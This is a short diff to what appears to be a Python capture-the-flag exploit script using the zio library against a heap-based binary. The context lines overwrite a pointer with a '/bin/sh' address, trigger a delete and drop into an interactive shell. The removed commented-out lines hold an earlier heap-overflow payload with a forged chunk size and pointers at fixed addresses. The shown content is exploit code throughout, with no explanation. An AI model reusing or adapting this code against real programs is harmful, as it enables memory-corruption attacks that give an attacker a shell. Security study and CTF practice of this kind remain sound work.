@@ -109,16 +109,3 @@ edit(1, buf=zio.l64(binsh_addr))
 delete(0)
 
 io.interact()
-
-# raw_input()
-
-
-# io.writelines(['2', '256', 'B' * 255])
-# io.writelines(['2', '256', 'B' * 255])
-# io.writelines(['3', '0', '288'])
-# raw_input()
-# io.write('B' * 264 + zio.l64(0x41) + zio.l64(0x6016C0 + 0x28 - 0x10) + zio.l64(0x6016C0 + 0x28 - 0x18))
-# raw_input()
-# io.writelines(['4', '0'])
-# # io.writelines(['4', '1'])
-# io.read_until_timeout()
